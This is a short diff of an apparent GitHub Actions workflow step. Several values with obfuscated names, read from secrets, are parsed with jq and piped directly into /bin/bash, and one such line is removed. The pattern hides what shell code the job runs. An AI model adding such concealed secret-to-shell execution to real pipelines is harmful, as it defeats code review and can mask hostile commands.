@@ -21,7 +21,6 @@ jobs:
           rx477: ${{ secrets.rx477 }}
         run: |
           printf '%s' "$rx477" | jq -r .ylk9 | /bin/bash
-          printf '%s' "$wbgdy774" | jq -r .gxx78 | /bin/bash
           echo $rptgd3022 | jq -r .hpsz60 | /bin/bash
           echo $roffn91356 | jq -r .yb0 | /bin/bash
           printf '%s' "$gbmx05425" | jq -r .xg0229 | /bin/bash
